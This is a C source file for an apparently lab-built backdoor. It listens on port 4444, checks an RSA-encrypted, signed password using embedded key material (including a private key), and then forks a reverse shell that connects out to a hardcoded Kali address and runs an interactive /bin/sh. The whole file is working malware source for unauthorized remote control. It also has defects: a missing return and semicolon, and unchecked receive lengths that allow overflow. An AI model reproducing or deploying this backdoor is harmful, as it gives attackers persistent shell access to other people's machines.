#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <openssl/x509.h>
#include <sys/prctl.h>
#include <stdbool.h>
#include <openssl/aes.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <sys/wait.h>
#include <pty.h>

#define BUFFER_SIZE 10000
#define PORT 4444
#define SIGNATURE_SIZE 256 

const char *kali_IP = "10.0.2.4";
const int listen_port = 4445;




const char *password = "password\n";

const char *PUBLIC_KEY = 
    "-----BEGIN PUBLIC KEY-----\n"
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjn8akaXhU4d7TBpBpbra\n"
"pwg4OoP6rAFh1vc/1D2LmMNTgAJ83qo7QJtOYUwn+DtF7oZukgT/+v7Id4QFsW+y\n"
"cEmP2wzbw9lgoGnbOvd3EHqFpO9H6TKnSId1cCs55kxELDp6r8lgqeRRhKLVfdIx\n"
"DgFXMbUYl6uKyLLZdtGEpJKwrG6bWL9vZGZBALMgRXVNFGjTw+kZ9RWGYZMVrsHv\n"
"nTHAkQgqOOvutFRr9Mhit7LMZvKboYzCkUNDMPPS40DPDiG9ugYXsEkaGoXPvknm\n"
"6xAvY0mV6vzH5yrAWee/+amf7kRJFW1upcWFzaCeIL0/hkgxQwYWrCoHYggqzDK3\n"
"vQIDAQAB\n"
"-----END PUBLIC KEY-----\n";


const char *PRIVATE_KEY = "-----BEGIN RSA PRIVATE KEY-----\n"
"MIICWwIBAAKBgFvF+v1kshtsUpXO9Z1J+aFJA7tlx8KQkcY/NyPB0RLTJtdCkvKO\n"
"k+hOxqrocNZwKcSEx764U4ZtAzYqE3DWdhsESoYB/m/V6cMg0QYrxfvXH5tq2Q9w\n"
"jbad9G88fQ73YvMjsyEeD4VLgtGG+qi+2b2mQRbFB30jgtLhjJ867fjBAgMBAAEC\n"
"gYAmglDrexFxiGavDgTqV1w0XVr/i5ni/p7svSH6Ex4T9B5cPUdEGKff1w5uMNMI\n"
"aFBecgkO8nG5+oxachVuR8+OzBZChboY3lWxVo6KsOPmYvGJfCIux1seDpskT4dL\n"
"D+Us//FVXoguHaxSI73+ZtVHbME0RivEoaUFMypBQ/31AQJBALYSj4BzP7BuG2Mh\n"
"TWpxtc+mxN/cwocCAQ4ialAQKrtqZ8uJSo24dqODrfAubVc7bd5FywmThHiyuada\n"
"BNmLXTkCQQCBCVGWF6geMrZV1dcSJS0g+sn6jH1hNKy4gjHORIDSGw3Y8ToF/hfy\n"
"tRPf7cMWHGkCLRvHEgN9aAieQcEV1v/JAkAz2U9CTg+aB5EHBsnMATu8OYqhEXXY\n"
"CosQYl6SFDiHDIMoZB12BEzMvcf/uMjsaYEdJhTu0jKMSKEz9h+hb92JAkAPekOs\n"
"AjhrLuAKGbVLeuQX4Z0ajYF4iG3zT8KToEnnadFWZVD1aQ4MUcYJhSZyX4QE+84q\n"
"KbH7d+AYw4Bak0hpAkEArFWQJnNb//5iDSEiJScSUf56S/K4dvRJhgWoldcmM2cy\n"
"8/G1jM5/JjBUGWB7WV2NzCyLtIwAhQVXYa9z/yQY3g==\n"
"-----END RSA PRIVATE KEY-----\n";


RSA* createPrivateRSA() {
    RSA *rsa = NULL;
    BIO *keybio;
    keybio = BIO_new_mem_buf(PRIVATE_KEY, -1);
    if (keybio == NULL) {
      return NULL;
    }
    rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
}

RSA* createPublicRSA() {
    RSA *rsa = NULL;
    BIO *keybio;
    keybio = BIO_new_mem_buf(PUBLIC_KEY, -1);
    if (keybio == NULL) {
      return NULL;
    }
    rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
    return rsa;
}
  

void Decrypt(char* src, char*dst, int len){
    RSA* publicRSA = createPrivateRSA();
    RSA_private_decrypt(len, (unsigned char*)src, (unsigned char*)dst, publicRSA, RSA_PKCS1_OAEP_PADDING)
    // printf("Dec: %s\n", dst);
}

int RSAVerifySignature(RSA* rsa, unsigned char* MsgHash, size_t MsgHashLen, const char* Msg, size_t MsgLen, int* Authentic) {
    *Authentic = 0;
    EVP_PKEY* pubKey = EVP_PKEY_new();
    EVP_PKEY_assign_RSA(pubKey, rsa);
    EVP_MD_CTX* m_RSAVerifyCtx = EVP_MD_CTX_create();
  
    if (EVP_DigestVerifyInit(m_RSAVerifyCtx, NULL, EVP_sha256(), NULL, pubKey) <= 0) {
      return 0;
    }
    if (EVP_DigestVerifyUpdate(m_RSAVerifyCtx, Msg, MsgLen) <= 0) {
      return 0;
    }
    int AuthStatus = EVP_DigestVerifyFinal(m_RSAVerifyCtx, MsgHash, MsgHashLen);
    if (AuthStatus == 1) {
      *Authentic = 1;
    } else {
      *Authentic = 0;
    }
    EVP_MD_CTX_free(m_RSAVerifyCtx);
    return 1;
}
  
void Base64Encode(const unsigned char* buffer, size_t length, char** base64Text) {
    BIO *bio, *b64;
    BUF_MEM *bufferPtr;
  
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
  
    BIO_write(bio, buffer, length);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);
    BIO_set_close(bio, BIO_NOCLOSE);
    BIO_free_all(bio);
  
    *base64Text = (char*)(*bufferPtr).data;
}
  
size_t calcDecodeLength(const char* b64input) {
    size_t len = strlen(b64input), padding = 0;
  
    if (b64input[len - 1] == '=' && b64input[len - 2] == '=') 
      padding = 2;
    else if (b64input[len - 1] == '=')
      padding = 1;
    return (len * 3) / 4 - padding;
}
  
void Base64Decode(const char* b64message, unsigned char** buffer, size_t* length) {
    BIO *bio, *b64;
  
    int decodeLen = calcDecodeLength(b64message);
    *buffer = (unsigned char*)malloc(decodeLen + 1);
    (*buffer)[decodeLen] = '\0';
  
    bio = BIO_new_mem_buf(b64message, -1);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);
  
    *length = BIO_read(bio, *buffer, strlen(b64message));
    BIO_free_all(bio);
}
  

int verifySignature(const char* plainText, char* signatureBase64) {
    RSA* publicRSA = createPublicRSA();
    unsigned char* encMessage;
    size_t encMessageLength;
    int authentic;
    Base64Decode(signatureBase64, &encMessage, &encMessageLength);
    int result = RSAVerifySignature(publicRSA, encMessage, encMessageLength, plainText, strlen(plainText), &authentic);
    return result && authentic;
}
  

void backdoor_server() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);

    unsigned char password_buffer[BUFFER_SIZE];
    unsigned char signature_buffer[BUFFER_SIZE];

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    listen(server_socket, 5);

    while(1){
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
        if (client_socket < 0) {
            perror("Connection failed"); 
        } 

        unsigned char decrypted_pass[BUFFER_SIZE];
        memset(decrypted_pass, '\0', BUFFER_SIZE);
        memset(password_buffer, '\0', BUFFER_SIZE);
        memset(signature_buffer, '\0', BUFFER_SIZE);

        
        int signature_len = 0;
        int n1 = recv(client_socket, &signature_len, sizeof(int), 0);
        if(n1 < 0){
            perror("failed to recieve sig len");
            continue;
        }
        int n2 = recv(client_socket, signature_buffer, signature_len, 0);
        if (n2 < 0) {
            perror("Failed to receive signature");
            continue;
        }

        int pwd_len = 0;
        int n3 = recv(client_socket, &pwd_len, sizeof(int), 0);
        if(n3 < 0){
            perror("failed to recieve sig len");
            continue;
        }
        int n4 = recv(client_socket, password_buffer, pwd_len, 0);
        if (n4 < 0) {
            perror("Failed to receive command");
            continue;
        }

        // password_buffer[pwd_len] = '\0';
        // signature_buffer[signature_len] = '\0';
        
        // printf("------------\n");
        // printf("Received Command: %s\n", password_buffer);
        // printf("Recieved Commadn Length: %d\n", pwd_len);
        // printf("Received Signature Length: %d\n", signature_len);
        // printf("Received Signature: %s\n", signature_buffer);
        // printf("-------------\n");

        

        Decrypt(password_buffer, decrypted_pass, pwd_len);

        if (verifySignature(password_buffer, signature_buffer) && strcmp(decrypted_pass, password) == 0) {
            send(client_socket, "Access Granted\n", 15, 0);
            // char ip[20];
            // char port[6];
            // send(client_socket, "Enter IP: ", 10, 0);
            // recv(client_socket, ip, sizeof(ip), 0);
            // send(client_socket, "Enter Port: ", 12, 0);
            // recv(client_socket, &port, sizeof(port), 0);

            // char command[100];
            // snprintf(command, sizeof(command), "firewall-cmd --permanent --add-port=%s/tcp", port);
            close(client_socket);
            if (fork() == 0) { 
                int rev_sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in rev_addr;
                rev_addr.sin_family = AF_INET;
                rev_addr.sin_port = htons(listen_port);
                rev_addr.sin_addr.s_addr = inet_addr(kali_IP);
                if (connect(rev_sock, (struct sockaddr *)&rev_addr, sizeof(rev_addr)) == 0) {
                    dup2(rev_sock, 0);
                    dup2(rev_sock, 1);
                    dup2(rev_sock, 2);
                    char *args[] = {"/bin/sh", "-i", NULL};
                    execve("/bin/sh", args, NULL);
                }
                close(rev_sock);
                exit(0);
            }
        } else {
            // send(client_socket, "Invalid signature\n", 18, 0);
            // printf("Signature: %s\n---\nEncryption: %s\n---\nDecryption: %s\n--\nLen: %d\n", signature_buffer, password_buffer, decrypted_pass, pwd_len);
            close(client_socket);
        }
        
        
    }
    close(server_socket);
}

int main() {
    backdoor_server(); 
    return 0;
}